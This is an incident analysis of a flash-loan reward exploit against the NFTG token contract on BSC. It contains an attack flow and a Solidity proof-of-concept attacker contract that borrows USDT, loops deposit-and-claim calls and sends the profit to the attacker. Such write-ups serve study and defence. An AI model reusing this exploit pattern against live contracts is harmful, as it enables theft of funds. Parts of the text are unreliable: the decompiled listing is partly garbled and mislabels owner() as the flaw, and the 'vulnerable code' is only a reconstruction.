# NFTG — DODO Flash Loan Reward Manipulation Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-07 |
| **Protocol** | NFTG Token |
| **Chain** | BSC |
| **Loss** | ~10,000 USD |
| **Attacker** | [0x5af00b07](https://bscscan.com/address/0x5af00b07a55f55775e4d99249dc7d81f5bc14c22) |
| **Attack Tx** | [0xbd330fd1](https://bscscan.com/tx/0xbd330fd17d0f825042474843a223547132a49abb0746a7e762a0b15cf4bd28f6) |
| **Vulnerable Contract** | [0x5fbbb391](https://bscscan.com/address/0x5fbbb391d54f4fb1d1cf18310c93d400bc80042e) |
| **Root Cause** | The `0x85d07203` function in the NFTG contract calculates rewards based solely on the USDT deposit amount with no holding period validation, allowing repeated deposits within a single transaction to claim excessive rewards |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/NFTG_exp.sol) |

---
## 1. Vulnerability Overview

The NFTG contract paid out rewards proportional to the deposit amount whenever USDT was transferred and a specific function (selector `0x85d07203`) was called. The attacker borrowed 825.5555 USDT via a DODO flash loan, then repeatedly transferred small amounts of USDT and called that function in a loop, collecting far more rewards than the actual cost incurred.

## 2. Vulnerable Code Analysis

```solidity
// ❌ NFTG: deposit-based reward function callable repeatedly
contract NFTGContract {
    // selector 0x85d07203
    function depositAndClaim(uint256 amount, address recipient) external {
        // ❌ No protection against repeated calls
        // ❌ Can be repeated with flash loan funds
        require(IERC20(USDT).balanceOf(address(this)) >= amount);

        // Reward calculated based on deposit amount (manipulable via flash loan)
        uint256 reward = calculateReward(amount);
        INFTG(NFTG_TOKEN).mint(recipient, reward);
    }
}

// ✅ Fix:
// Prevent repeated calls within a single transaction
// Add nonReentrant + per-call cooldown
// Add flash loan fund detection logic
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: NFTG_decompiled.sol
contract NFTG {
contract NFTG {
    address public owner;


    // selector: 0x8da5cb5b
    function owner() external view returns (address) {}  // ❌ vulnerability

    // selector: 0xb078d5c2
    function percentCommissionRef() external {}

    // selector: 0xe8e7426e
    function Presale(address p0) external {}

    // selector: 0xf2fde38b
    // Alternative: _SIMONdotBLACK_(int8[],uint256,address,bytes8,int96)
    function transferOwnership(address p0) external {}

    // selector: 0xf51f96dd
    function salePrice() external {}

    // selector: 0xf873786e
    function setCommissionPercentEther(uint8 p0) external {}

    // selector: 0xb187bd26
    function isPaused() external view returns (bool) {}

    // selector: 0xbe5f9ccc
    function unknown_be5f9ccc() external {}

    // selector: 0xe5671aad
    function unknown_e5671aad() external {}

    // selector: 0xaab60f3e
    function unknown_aab60f3e() external {}

    // selector: 0xac2ff5e1
    function commissionPercentEther() external {}

    // selector: 0xad80fd99
    function unknown_ad80fd99() external {}

    // selector: 0xae27a472
    function unknown_ae27a472() external {}

    // selector: 0x902dfe00
    function getBNBUSDTPrice() external view returns (uint256) {}

    // selector: 0xa2aeb80e
    function minBuyUSDT() external {}

    // selector: 0x51d6d0fe
    function maxBuyUSDT() external {}

    // selector: 0x715018a6
    function renounceOwnership() external {}

    // selector: 0x8456cb59
    function pause() external {}

    // selector: 0x85d07203
    function unknown_85d07203() external {}

    // selector: 0x860779e7
    function setMinBuy(uint256 p0) external {}

    // selector: 0x70db69d6
    function maxBuy() external {}

    // selector: 0x7107d7a6
    function minBuy() external {}

    // selector: 0x3ded33bc
    function setMainContract(address p0) external {}

    // selector: 0x3f4ba83a
    function unpause() external {}

    // selector: 0x417d68cb
    function unknown_417d68cb() external {}

    // selector: 0x4eea2ed4
    function unknown_4eea2ed4() external {}

    // selector: 0x070b8e5d
    function setPercentCommissionRef(uint8 p0) external {}

    // selector: 0x1919fed7
    function setSalePrice(uint256 p0) external {}

    // selector: 0x3a2a034c
    function unknown_3a2a034c() external {}

    // selector: 0x23b872dd
    // 📌 Arbitrary transferFrom — approval validation required
    function transferFrom(address p0, address p1, uint256 p2) external {}

    // selector: 0x70a08231
    function balanceOf(address p0) external view returns (uint256) {}

    // selector: 0xa9059cbb
    function transfer(address p0, uint256 p1) external {}

    // selector: 0x50d25bcd
    function latestAnswer() external {}
}
```

## 3. Attack Flow

```
Attacker (0x5af00b07)
  │
  ├─[1]─▶ USDT.approve(addr1, max)
  │
  ├─[2]─▶ DODO.flashLoan(0, 825555.5 USDT, this, 0x3078)
  │
  ├─[3]─▶ DPPFlashLoanCall callback:
  │         └─ for idx in range(11):
  │             USDT.transfer(addr1, idx*1e13 + 11*1e13)
  │             addr1.call(selector_0x85d07203, 2125*1e13*3600, this)
  │             → repeated small deposits + reward claims
  │
  ├─[4]─▶ Repay DODO flash loan (825.5555 USDT)
  │
  └─[5]─▶ Transfer remaining USDT to attacker → ~10,000 USD profit
```

## 4. PoC Code

```solidity
contract AttackerC {
    function transfer() public {
        IBEP20USDT(BEP20USDT).approve(addr1, type(uint256).max);
        // Borrow USDT via DODO flash loan
        IDPP(DPP).flashLoan(0, 8255555 * 10**14, address(this), hex"3078");
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // ❌ Repeat 11 times: small deposit + reward claim
        for (uint256 idx = 0; idx < 11; idx++) {
            uint256 depositAmount = (idx * 10**13) + (11 * 10**13);
            IBEP20USDT(BEP20USDT).transfer(addr1, depositAmount);

            // selector 0x85d07203: depositAndClaim
            (bool s, ) = addr1.call(
                abi.encodeWithSelector(bytes4(0x85d07203), 2125 * 10**13 * 3600, address(this))
            );
            require(s, "call failed");
        }

        // Repay flash loan
        IBEP20USDT(BEP20USDT).transfer(DPP, 8255555 * 10**14);

        // Transfer profit
        uint256 bal = IBEP20USDT(BEP20USDT).balanceOf(address(this));
        IBEP20USDT(BEP20USDT).transfer(attacker, bal);
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Business Logic Vulnerability |
| **Attack Vector** | Flash Loan + Repeated Reward Claims |
| **CWE** | CWE-799: Improper Control of Interaction Frequency |
| **DASP** | Business Logic Vulnerability |
| **Severity** | Medium |

## 6. Remediation Recommendations

1. **Repeated Call Prevention**: Detect and block repeated calls to the same function within the same transaction
2. **Cooldown Mechanism**: Enforce a minimum interval between calls per address
3. **Flash Loan Detection**: Detect large fund flows within a single transaction
4. **Reward Cap**: Limit the maximum reward amount claimable per call

## 7. Lessons Learned

- Deposit-based reward functions are vulnerable to repeated-call attacks when combined with flash loans.
- Preventing repeated calls within a single transaction alone is sufficient to block this type of attack.
- When designing reward mechanisms, always account for the possibility of abuse within a single block.